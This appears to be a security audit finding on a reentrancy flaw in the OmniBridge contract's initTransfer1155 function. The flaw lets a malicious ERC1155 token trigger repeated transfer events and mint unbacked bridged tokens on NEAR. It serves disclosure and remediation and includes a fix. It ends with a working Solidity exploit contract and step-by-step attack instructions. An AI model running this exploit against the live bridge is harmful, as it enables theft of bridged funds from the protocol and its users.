### Title
Reentrancy in `initTransfer1155` via Malicious ERC1155 `safeTransferFrom` Enables Unbacked Token Minting on NEAR — (`evm/src/omni-bridge/contracts/OmniBridge.sol`)

---

### Summary

`initTransfer1155` makes an external call to an attacker-controlled ERC1155 contract's `safeTransferFrom` before the `InitTransfer` event is emitted (and before the Wormhole message is published in `OmniBridgeWormhole`). A malicious ERC1155 token can re-enter `initTransfer1155` during that call, causing multiple `InitTransfer` events to be emitted with distinct nonces while only one (or zero) actual token transfers occur. The NEAR side processes each event independently and mints bridged tokens for each, resulting in unbacked supply.

---

### Finding Description

In `OmniBridge.sol`, `initTransfer1155` follows this sequence:

```
1. currentOriginNonce += 1                          // line 448 — nonce incremented
2. IERC1155(tokenAddress).safeTransferFrom(...)     // line 458 — EXTERNAL CALL to attacker-controlled contract
3. initTransferExtension(...)                       // line 468 — Wormhole message published (in Wormhole variant)
4. emit BridgeTypes.InitTransfer(...)               // line 480 — event emitted
``` [1](#0-0) 

There is no reentrancy guard on this function. The `tokenAddress` parameter is fully attacker-controlled — any ERC1155 contract address is accepted without validation. A malicious ERC1155 token can implement `safeTransferFrom` to re-enter `initTransfer1155` before returning. Each re-entrant call:

- Increments `currentOriginNonce` to a fresh value (so each call gets a unique nonce)
- Calls `safeTransferFrom` again (the malicious token can skip the actual transfer in re-entrant calls)
- Publishes a Wormhole message (in `OmniBridgeWormhole`) for the re-entrant nonce
- Emits an `InitTransfer` event for the re-entrant nonce [2](#0-1) 

The result: N re-entrant calls produce N+1 `InitTransfer` events (and N+1 Wormhole messages) while only 1 actual token transfer (or zero, if the malicious token never transfers) occurs.

The NEAR side's `fin_transfer_callback` validates only that the emitter is a known factory and that the token has registered decimals. Since all events are emitted by the legitimate OmniBridge contract (a known factory), and the token can be registered permissionlessly (see below), the NEAR side processes every fraudulent event and mints bridged tokens for each. [3](#0-2) 

---

### Impact Explanation

**Critical — unauthorized minting of bridged tokens on NEAR without locking ERC1155 tokens on EVM.**

The attacker receives N × `amount` of bridged NEAR tokens backed by only 1 × `amount` (or zero) of locked ERC1155 tokens on EVM. This directly breaks bridge collateralization: the bridged token supply on NEAR exceeds the locked supply on EVM. The attacker can then bridge those unbacked tokens back to EVM via `fin_transfer`, draining real ERC1155 tokens from the bridge vault.

---

### Likelihood Explanation

The attack requires only permissionless on-chain actions:

1. **Deploy a malicious ERC1155 token** — no permission needed.
2. **Call `logMetadata1155(maliciousToken, tokenId)`** — permissionless; sets `multiTokens[deterministicToken]` and emits `LogMetadata`. [4](#0-3) 
3. **Submit proof of the `LogMetadata` event to NEAR's `deploy_token`** — permissionless; NEAR deploys a bridged token for `deterministicToken` and registers its decimals. [5](#0-4) 
4. **Call `initTransfer1155(maliciousToken, tokenId, amount, ...)`** — the malicious token re-enters N times during `safeTransferFrom`, emitting N+1 `InitTransfer` events.

No privileged role, leaked key, or trusted operator is required. The entire attack is executable by any unprivileged EVM user.

---

### Recommendation

Apply a reentrancy guard (e.g., OpenZeppelin `ReentrancyGuardUpgradeable`) to `initTransfer1155` and `initTransfer`. Alternatively, follow the checks-effects-interactions pattern strictly: emit the `InitTransfer` event and publish the Wormhole message **before** calling `safeTransferFrom`. Since `currentOriginNonce` is already incremented first, the nonce is safe; the remaining fix is to move the event emission and extension call ahead of the external token transfer.

---

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "@openzeppelin/contracts/token/ERC1155/IERC1155Receiver.sol";

interface IOmniBridge {
    function initTransfer1155(
        address tokenAddress,
        uint256 tokenId,
        uint128 amount,
        uint128 fee,
        uint128 nativeFee,
        string calldata recipient,
        string calldata message
    ) external payable;
}

contract MaliciousERC1155 {
    IOmniBridge public bridge;
    uint256 public reentrancyCount;
    uint256 public maxReentrancy = 3;

    constructor(address _bridge) {
        bridge = IOmniBridge(_bridge);
    }

    // Fake ERC1155 — safeTransferFrom re-enters initTransfer1155
    function safeTransferFrom(
        address, address, uint256 tokenId, uint256 amount, bytes calldata
    ) external {
        if (reentrancyCount < maxReentrancy) {
            reentrancyCount++;
            // Re-enter without actually transferring tokens
            bridge.initTransfer1155(
                address(this), tokenId, uint128(amount), 0, 0, "attacker.near", ""
            );
        }
        // On final call, do nothing — no tokens transferred
    }

    function balanceOf(address, uint256) external pure returns (uint256) { return 1000; }
    function isApprovedForAll(address, address) external pure returns (bool) { return true; }
}

// Attack:
// 1. Deploy MaliciousERC1155(bridgeAddress)
// 2. Call logMetadata1155(maliciousToken, tokenId) on bridge
// 3. Submit LogMetadata proof to NEAR deploy_token
// 4. Call bridge.initTransfer1155(maliciousToken, tokenId, 100, 0, 0, "attacker.near", "")
//    → 4 InitTransfer events emitted (nonces N, N+1, N+2, N+3)
//    → 0 actual ERC1155 tokens locked
//    → NEAR mints 4×100 = 400 bridged tokens for attacker
```

The four `InitTransfer` events are all emitted by the legitimate OmniBridge contract with the registered `deterministicToken` address. The NEAR side's `fin_transfer_callback` accepts each one, calling `process_fin_transfer_to_near` four times and minting 400 tokens against zero locked collateral. [6](#0-5) [7](#0-6)
